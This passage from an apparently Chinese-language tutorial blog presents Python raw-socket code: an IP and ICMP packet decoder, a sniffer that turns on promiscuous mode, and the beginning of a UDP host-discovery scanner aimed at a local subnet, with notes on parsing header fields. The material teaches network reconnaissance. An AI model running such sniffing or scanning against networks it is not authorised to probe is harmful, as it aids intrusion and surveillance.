</span></span><span class=line><span class=cl>        <span class=c1># map protocol constants to their names</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>protocol_map</span> <span class=o>=</span> <span class=p>{</span><span class=mi>1</span><span class=p>:</span> <span class=s2>&#34;ICMP&#34;</span><span class=p>,</span> <span class=mi>6</span><span class=p>:</span> <span class=s2>&#34;TCP&#34;</span><span class=p>,</span> <span class=mi>17</span><span class=p>:</span> <span class=s2>&#34;UDP&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># human readable IP addresses</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>src_address</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>inet_ntoa</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;@I&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>src</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>dst_address</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>inet_ntoa</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;@I&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>dst</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># human readable protocol</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>protocol</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>protocol_map</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>protocol_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>protocol</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>protocol_num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># create a raw socket and bind it to the public interface</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>socket_protocol</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_IP</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>socket_protocol</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_ICMP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sniffer</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_RAW</span><span class=p>,</span> <span class=n>socket_protocol</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sniffer</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># we want the IP headers included in the capture</span>
</span></span><span class=line><span class=cl><span class=n>sniffer</span><span class=o>.</span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_IP</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>IP_HDRINCL</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if we&#39;re on Windows we need to send some ioctl</span>
</span></span><span class=line><span class=cl><span class=c1># to setup promiscuous mode</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sniffer</span><span class=o>.</span><span class=n>ioctl</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SIO_RCVALL</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>RCVALL_ON</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># read in a single packet</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_buffer</span> <span class=o>=</span> <span class=n>sniffer</span><span class=o>.</span><span class=n>recvfrom</span><span class=p>(</span><span class=mi>65535</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># create an IP header from the first 20 bytes of the buffer</span>
</span></span><span class=line><span class=cl>        <span class=n>ip_header</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>raw_buffer</span><span class=p>[:</span><span class=mi>20</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Protocol: </span><span class=si>%s</span><span class=s2> </span><span class=si>%s</span><span class=s2> -&gt; </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span><span class=o>.</span><span class=n>protocol</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span><span class=o>.</span><span class=n>src_address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span><span class=o>.</span><span class=n>dst_address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># if we&#39;re on Windows turn off promiscuous mode</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sniffer</span><span class=o>.</span><span class=n>ioctl</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SIO_RCVALL</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>RCVALL_OFF</span><span class=p>)</span>
</span></span></code></pre></div><p>這很像把水用成造型冰塊一樣，把byte依據field的規定來找出我們需要的資訊
<img loading=lazy src=https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/IPv4_Packet_-en.svg/1280px-IPv4_Packet_-en.svg.png alt="IP header format"></p><hr><p>sniffer_with_icmp.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># host to listen on</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;192.168.0.187&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>IP</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>_fields_</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;ihl&#34;</span><span class=p>,</span>           <span class=n>c_ubyte</span><span class=p>,</span> <span class=mi>4</span><span class=p>),</span> <span class=c1># c_ubyte的前4個bits</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;version&#34;</span><span class=p>,</span>       <span class=n>c_ubyte</span><span class=p>,</span> <span class=mi>4</span><span class=p>),</span> <span class=c1># c_ubyte的後4個bits</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;tos&#34;</span><span class=p>,</span>           <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;len&#34;</span><span class=p>,</span>           <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;id&#34;</span><span class=p>,</span>            <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;offset&#34;</span><span class=p>,</span>        <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;ttl&#34;</span><span class=p>,</span>           <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;protocol_num&#34;</span><span class=p>,</span>  <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;sum&#34;</span><span class=p>,</span>           <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;src&#34;</span><span class=p>,</span>           <span class=n>c_uint32</span><span class=p>),</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;dst&#34;</span><span class=p>,</span>           <span class=n>c_uint32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__new__</span><span class=p>(</span><span class=bp>cls</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>cls</span><span class=o>.</span><span class=n>from_buffer_copy</span><span class=p>(</span><span class=n>socket_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>socket_buffer</span> <span class=o>=</span> <span class=n>socket_buffer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># map protocol constants to their names</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>protocol_map</span> <span class=o>=</span> <span class=p>{</span><span class=mi>1</span><span class=p>:</span> <span class=s2>&#34;ICMP&#34;</span><span class=p>,</span> <span class=mi>6</span><span class=p>:</span> <span class=s2>&#34;TCP&#34;</span><span class=p>,</span> <span class=mi>17</span><span class=p>:</span> <span class=s2>&#34;UDP&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># human readable IP addresses</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>src_address</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>inet_ntoa</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;@I&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>src</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>dst_address</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>inet_ntoa</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;@I&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>dst</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>        <span class=c1># human readable protocol</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>protocol</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>protocol_map</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>protocol_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>protocol</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>protocol_num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ICMP</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>_fields_</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;type&#34;</span><span class=p>,</span>         <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>,</span>         <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;checksum&#34;</span><span class=p>,</span>     <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;unused&#34;</span><span class=p>,</span>       <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;next_hop_mtu&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__new__</span><span class=p>(</span><span class=bp>cls</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>cls</span><span class=o>.</span><span class=n>from_buffer_copy</span><span class=p>(</span><span class=n>socket_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>socket_buffer</span> <span class=o>=</span> <span class=n>socket_buffer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># create a raw socket and bind it to the public interface</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>socket_protocol</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_IP</span> 
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>socket_protocol</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_ICMP</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>sniffer</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_RAW</span><span class=p>,</span> <span class=n>socket_protocol</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sniffer</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># we want the IP headers included in the capture</span>
</span></span><span class=line><span class=cl><span class=n>sniffer</span><span class=o>.</span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_IP</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>IP_HDRINCL</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if we&#39;re on Windows we need to send some ioctl</span>
</span></span><span class=line><span class=cl><span class=c1># to setup promiscuous mode</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sniffer</span><span class=o>.</span><span class=n>ioctl</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SIO_RCVALL</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>RCVALL_ON</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># read in a single packet</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_buffer</span> <span class=o>=</span> <span class=n>sniffer</span><span class=o>.</span><span class=n>recvfrom</span><span class=p>(</span><span class=mi>65535</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># create an IP header from the first 20 bytes of the buffer</span>
</span></span><span class=line><span class=cl>        <span class=n>ip_header</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>raw_buffer</span><span class=p>[:</span><span class=mi>20</span><span class=p>])</span>
</span></span><span class=line><span class=cl>      
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Protocol: </span><span class=si>%s</span><span class=s2> </span><span class=si>%s</span><span class=s2> -&gt; </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span><span class=o>.</span><span class=n>protocol</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span><span class=o>.</span><span class=n>src_address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span><span class=o>.</span><span class=n>dst_address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># if it&#39;s ICMP we want it</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ip_header</span><span class=o>.</span><span class=n>protocol</span> <span class=o>==</span> <span class=s2>&#34;ICMP&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># calculate where our ICMP packet starts</span>
</span></span><span class=line><span class=cl>            <span class=n>offset</span> <span class=o>=</span> <span class=n>ip_header</span><span class=o>.</span><span class=n>ihl</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>            <span class=n>buf</span> <span class=o>=</span> <span class=n>raw_buffer</span><span class=p>[</span><span class=n>offset</span><span class=p>:</span><span class=n>offset</span> <span class=o>+</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>ICMP</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=c1># create our ICMP structure</span>
</span></span><span class=line><span class=cl>            <span class=n>icmp_header</span> <span class=o>=</span> <span class=n>ICMP</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;ICMP -&gt; Type: </span><span class=si>%d</span><span class=s2> Code: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>icmp_header</span><span class=o>.</span><span class=n>type</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>icmp_header</span><span class=o>.</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                  <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># handle CTRL-C</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># if we&#39;re on Windows turn off promiscuous mode</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sniffer</span><span class=o>.</span><span class=n>ioctl</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SIO_RCVALL</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>RCVALL_OFF</span><span class=p>)</span>
</span></span></code></pre></div><p>ICMP是<code>(IP (ICMP ...))</code>的包裝
但都byte要怎麼區分哪裡是IP還是ICMP的byte?</p><p>因此IP要知道自己有多長(<code>ip_header.ihl * 4</code>，乘4是因為ihl的單位是4bytes)，這樣就可以知道ICMP從哪邊開始</p><hr><p>scanner.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ipaddress</span> <span class=kn>import</span> <span class=n>ip_address</span><span class=p>,</span> <span class=n>ip_network</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># host to listen on</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;192.168.0.187&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># subnet to target</span>
</span></span><span class=line><span class=cl><span class=n>tgt_subnet</span> <span class=o>=</span> <span class=s2>&#34;192.168.0.0/24&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># magic we&#39;ll check ICMP responses for</span>
</span></span><span class=line><span class=cl><span class=n>tgt_message</span> <span class=o>=</span> <span class=s2>&#34;PYTHONRULES!&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>udp_sender</span><span class=p>(</span><span class=n>sub_net</span><span class=p>,</span> <span class=n>magic_message</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sender</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_DGRAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>ip</span> <span class=ow>in</span> <span class=n>ip_network</span><span class=p>(</span><span class=n>sub_net</span><span class=p>)</span><span class=o>.</span><span class=n>hosts</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>sender</span><span class=o>.</span><span class=n>sendto</span><span class=p>(</span><span class=n>magic_message</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>),</span> <span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>ip</span><span class=p>),</span> <span class=mi>65212</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>IP</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>_fields_</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;ihl&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>,</span> <span class=mi>4</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;version&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>,</span> <span class=mi>4</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;tos&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;len&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;id&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;offset&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;ttl&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;protocol_num&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;sum&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;src&#34;</span><span class=p>,</span> <span class=n>c_uint32</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;dst&#34;</span><span class=p>,</span> <span class=n>c_uint32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__new__</span><span class=p>(</span><span class=bp>cls</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>cls</span><span class=o>.</span><span class=n>from_buffer_copy</span><span class=p>(</span><span class=n>socket_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>socket_buffer</span> <span class=o>=</span> <span class=n>socket_buffer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># map protocol constants to their names</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>protocol_map</span> <span class=o>=</span> <span class=p>{</span><span class=mi>1</span><span class=p>:</span> <span class=s2>&#34;ICMP&#34;</span><span class=p>,</span> <span class=mi>6</span><span class=p>:</span> <span class=s2>&#34;TCP&#34;</span><span class=p>,</span> <span class=mi>17</span><span class=p>:</span> <span class=s2>&#34;UDP&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># human readable IP addresses</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>src_address</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>inet_ntoa</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;@I&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>src</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>dst_address</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>inet_ntoa</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;@I&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>dst</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
